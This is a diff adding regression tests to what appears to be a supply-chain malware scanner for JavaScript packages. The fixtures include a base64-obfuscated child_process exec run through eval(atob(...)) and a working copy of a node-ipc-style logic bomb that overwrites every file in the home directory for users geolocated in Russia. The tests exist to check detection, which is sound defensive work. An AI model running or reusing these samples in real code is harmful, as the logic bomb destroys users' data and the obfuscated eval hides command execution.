@@ -1203,3 +1203,45 @@ test("minified file run by a lifecycle script gets the full scan", () => {
   });
   assert.equal(report.verdict, "block");
 });
+
+test("does not crash when exec appears only in the de-obfuscated text", () => {
+  // Regression: hasExec matches the normalized (de-obfuscated) text, but the
+  // info-snippet extraction re-matched EXEC_REGEX against the ORIGINAL content
+  // only — so a base64-encoded child_process call threw
+  // "Cannot read properties of null" instead of scanning the package.
+  const encoded = Buffer.from("require('child_process').exec('id')", "utf8").toString("base64");
+  assert.doesNotThrow(() => {
+    const report = auditEvidence({ sourceFiles: { "index.js": `eval(atob('${encoded}'));` } });
+    // still flagged as obfuscation (computed-arg eval over a decoded blob)
+    assert.equal(report.verdict, "block");
+    assert.ok(report.findings.some((f) => f.category === "obfuscation"));
+  });
+});
+
+test("flags a geo-gated in-place file-corruption logic bomb (node-ipc shape)", () => {
+  // node-ipc "peacenotwar" enumerated a directory and OVERWROTE each file's
+  // contents (it didn't delete them). The delete-only destructive patterns
+  // missed this entirely; the corruption case must now fire logic-bomb.
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0", repository: "https://github.com/x/x" }),
+      "cleanup.js":
+        "const fs=require('fs');fetch('https://api.ipgeolocation.io/ipgeo').then(r=>r.json()).then(g=>{" +
+        "if(g.country_name==='Russia'){fs.readdirSync(process.env.HOME).forEach(f=>fs.writeFileSync(process.env.HOME+'/'+f,'❤'));}});",
+    },
+  });
+  assert.ok(report.findings.some((f) => f.category === "logic-bomb"));
+});
+
+test("does not flag a bulk file write that has no geo/locale gate", () => {
+  // readdir + writeFile is normal build/codegen behavior. Without a region gate
+  // it must NOT be read as a logic bomb (keeps the corruption rule low-FP).
+  const report = auditEvidence({
+    sourceFiles: {
+      "package.json": JSON.stringify({ name: "x", version: "1.0.0", repository: "https://github.com/x/x" }),
+      "codegen.js":
+        "const fs=require('fs');fs.readdirSync('./templates').forEach(f=>fs.writeFileSync('./out/'+f, render(f)));",
+    },
+  });
+  assert.ok(!report.findings.some((f) => f.category === "logic-bomb"));
+});
